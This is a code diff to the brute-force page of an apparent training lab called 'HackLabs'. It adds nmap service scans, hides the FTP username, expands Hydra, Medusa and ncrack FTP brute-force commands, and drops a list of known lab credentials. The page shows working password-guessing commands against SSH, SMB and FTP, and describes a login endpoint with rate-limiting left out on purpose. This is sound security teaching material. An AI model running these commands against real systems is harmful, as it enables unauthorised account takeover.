@@ -55,11 +55,12 @@
     <div class="hl-card mb-4">
       <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SSH Bruteforce</div>
       <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_ssh_desc">
-        Ataque de fuerza bruta contra el servicio SSH de la máquina objetivo.
-        No hay rate-limiting activo; la autenticación se gestiona por el servidor SSH del host.
+        Servicio SSH real corriendo en el puerto 22 del host objetivo. No hay rate-limiting activo.
       </p>
       <div class="hl-code text-xs space-y-1">
-        <div class="text-gray-400"># Hydra</div>
+        <div class="text-gray-400"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 22 TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Hydra</div>
         <div>hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP</div>
         <div>hydra -L users.txt -P rockyou.txt -t 4 ssh://TARGET_IP</div>
         <div class="mt-2 text-gray-400"># Medusa</div>
@@ -78,10 +79,12 @@
     <div class="hl-card mb-4">
       <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">SMB Bruteforce</div>
       <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_smb_desc">
-        Ataque de fuerza bruta contra el servicio SMB/CIFS de la máquina objetivo (puerto 445).
+        Servicio SMB real corriendo en el puerto 445 del host objetivo. Detectable con nmap y bruteforceable con las herramientas habituales.
       </p>
       <div class="hl-code text-xs space-y-1">
-        <div class="text-gray-400"># Hydra</div>
+        <div class="text-gray-400"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 445 TARGET_IP</div>
+        <div class="mt-2 text-gray-400"># Hydra</div>
         <div>hydra -l Administrator -P rockyou.txt smb://TARGET_IP</div>
         <div class="mt-2 text-gray-400"># CrackMapExec</div>
         <div>crackmapexec smb TARGET_IP -u Administrator -p rockyou.txt</div>
@@ -99,18 +102,19 @@
   <!-- ── FTP Tab ── -->
   <div id="tab-ftp" class="tab-pane">
     <div class="hl-card mb-4">
-      <p class="text-sm text-gray-400 mb-4" data-i18n="bf_ftp_desc">
-        Ataque de fuerza bruta contra el servicio FTP de la máquina objetivo (puerto 21). No hay rate-limiting activo.
+      <div class="text-xs font-semibold uppercase tracking-wider mb-3" style="color:var(--hl-primary)">FTP Bruteforce</div>
+      <p class="text-sm text-gray-600 dark:text-gray-400 mb-4" data-i18n="bf_ftp_desc">
+        Servicio FTP real corriendo en el puerto 21 del host objetivo. Sin rate-limiting ni bloqueo de cuenta. El usuario y la contraseña son desconocidos — descúbrelos por fuerza bruta.
       </p>
-      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
-        <div>
-          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_host_ip">Host / IP</label>
-          <input type="text" id="ftp-host" placeholder="TARGET_IP" class="hl-input font-mono" />
-        </div>
-        <div>
-          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="lbl_username">Usuario</label>
-          <input type="text" id="ftp-user" value="admin" class="hl-input font-mono" />
-        </div>
+      <div class="hl-code text-xs space-y-1 mb-3">
+        <div class="text-gray-400"># Servicio FTP activo en:</div>
+        <div>ftp://TARGET_IP:21</div>
+        <div class="text-gray-400 mt-2"># Nmap — detección de servicio</div>
+        <div>nmap -sV -p 21,22,445 TARGET_IP</div>
+      </div>
+      <div class="flex items-center gap-2 p-3 rounded-lg text-xs" style="background:rgba(255,200,0,0.08);border:1px solid rgba(255,200,0,0.2)">
+        <i class="ph ph-warning text-yellow-400 text-sm"></i>
+        <span class="text-yellow-300">El usuario <strong>no está revelado</strong>. Usa una wordlist de usuarios para descubrirlo junto con la contraseña.</span>
       </div>
     </div>
   </div>
@@ -123,8 +127,7 @@
       <li>El endpoint <code>/bruteforce/login</code> no implementa rate-limiting ni bloqueo de cuenta.</li>
       <li><strong>Hydra HTTP:</strong> Ajusta el mensaje de error (<code>Credenciales incorrectas</code>) al texto real de respuesta fallida.</li>
       <li><strong>Burp Intruder:</strong> Usa Cluster Bomb para atacar usuario + contraseña simultáneamente.</li>
-      <li><strong>Wordlists recomendadas:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code></li>
-      <li><strong>Credenciales conocidas:</strong> admin/admin123, alice/password, bob/123456, charlie/qwerty, dave/letmein</li>
+      <li><strong>Wordlists recomendadas:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code>, <code>/usr/share/seclists/Usernames/</code></li>
       <li>Para SSH/SMB, reemplaza <code>TARGET_IP</code> por la IP de la máquina objetivo.</li>
     </ol>
     <h3>Herramientas</h3>
@@ -154,10 +157,20 @@ set RHOSTS TARGET_IP
 set SMBUser Administrator
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run</code></pre>
-    <h4>FTP — Hydra / Medusa / ncrack</h4>
-    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
-medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp
-ncrack -p 21 --user admin -P rockyou.txt TARGET_IP</code></pre>
+    <h4>FTP — Hydra (puerto 21, protocolo real)</h4>
+    <pre><code class="language-bash"># Cluster Bomb: descubrir usuario + contraseña
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      ftp://TARGET_IP
+
+# Si conoces el usuario:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+
+# Medusa
+medusa -h TARGET_IP -U users.txt -P rockyou.txt -M ftp
+
+# ncrack
+ncrack -p 21 -U users.txt -P rockyou.txt TARGET_IP</code></pre>
     <h4>FTP — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
 set RHOSTS TARGET_IP
@@ -171,8 +184,7 @@ run</code></pre>
       <li>HackLabs' <code>/bruteforce/login</code> endpoint has no rate-limiting or account lockout.</li>
       <li><strong>Hydra HTTP:</strong> Match the failure string (<code>Credenciales incorrectas</code>) to the actual failed response text.</li>
       <li><strong>Burp Intruder:</strong> Use Cluster Bomb to attack username + password simultaneously.</li>
-      <li><strong>Recommended wordlists:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code></li>
-      <li><strong>Known credentials:</strong> admin/admin123, alice/password, bob/123456, charlie/qwerty, dave/letmein</li>
+      <li><strong>Recommended wordlists:</strong> <code>/usr/share/wordlists/rockyou.txt</code>, <code>/usr/share/seclists/Passwords/</code>, <code>/usr/share/seclists/Usernames/</code></li>
       <li>For SSH/SMB, replace <code>TARGET_IP</code> with the target machine IP.</li>
     </ol>
     <h3>Tools</h3>
@@ -202,10 +214,20 @@ set RHOSTS TARGET_IP
 set SMBUser Administrator
 set PASS_FILE /usr/share/wordlists/rockyou.txt
 run</code></pre>
-    <h4>FTP — Hydra / Medusa / ncrack</h4>
-    <pre><code class="language-bash">hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
-medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp
-ncrack -p 21 --user admin -P rockyou.txt TARGET_IP</code></pre>
+    <h4>FTP — Hydra (port 21, real protocol)</h4>
+    <pre><code class="language-bash"># Cluster Bomb: discover username + password
+hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      ftp://TARGET_IP
+
+# If username is known:
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+
+# Medusa
+medusa -h TARGET_IP -U users.txt -P rockyou.txt -M ftp
+
+# ncrack
+ncrack -p 21 -U users.txt -P rockyou.txt TARGET_IP</code></pre>
     <h4>FTP — Metasploit</h4>
     <pre><code class="language-bash">use auxiliary/scanner/ftp/ftp_login
 set RHOSTS TARGET_IP
